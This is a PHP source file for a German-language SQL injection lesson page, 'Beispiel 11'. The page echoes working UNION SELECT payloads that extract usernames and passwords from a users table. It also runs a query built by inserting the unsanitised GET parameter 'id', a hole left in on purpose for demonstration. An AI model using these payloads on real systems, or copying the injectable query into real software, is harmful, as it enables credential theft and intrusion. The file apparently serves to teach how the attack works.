<?php
	$id = $_GET['id'];

	$host = 'localhost'; //Host: localhost
	$datenbankname = 'xxxx'; //Datenbankname
	$tablename = 'xxxx'; //Tabellenname
	$dbUsername = 'xxxx'; //Benutzername
	$dbPassword = 'xxxx'; //Password

	echo '
		<!DOCTYPE html>
		<html>
			<head>
				<meta charset="UTF-8">
				<title>Beispiel 11</title>
			</head>

			<body>
				<a href="http://sqlinjectionwwi.bplaced.net/">Zurück</a><br><br>
				<h1>Beispiel 11</h1>
				<p>Benutzernamen und Passwörter herausfinden</p>
				Dank der vorherigen Beispiele sind wir nun in der Lage, Nutzerdaten zu erbeuten.<br><br>
				Mit <code>+and+1=2+union+select+1,2,username,4+from+users+--+</code> können wir uns die Benutzernamen aus der Tabelle <code>users</code> in der Produktbeschreibung anzeigen lassen.<br>
				Mit <code>+and+1=2+union+select+1,2,passwort,4+from+users+--+</code> können wir uns die Passwörter der User in der Produktbeschreibung ausgeben lassen.
				<br><br>
				Somit haben wir nun Benutzer und Passwörter aus der Datenbank gestohlen!
				<br><br>Ausgabe:<br><br>';

	//Neue Verbindung öffnen
	$handler = new PDO("mysql:host=$host;dbname=$datenbankname", $dbUsername, $dbPassword);

	$lQuery = "SELECT id, preis, beschreibung, anzahl FROM $tablename WHERE id = $id";

	foreach ($handler->query($lQuery) as $lRow)
	{
		$lPreis = $lRow['preis'];
		$lBeschreibung = utf8_encode($lRow['beschreibung']);
		
		echo "Produktpreis: $lPreis Euro | Produktbeschreibung: $lBeschreibung <br>";
	}

	echo '
		</body></html> 
	';
?>

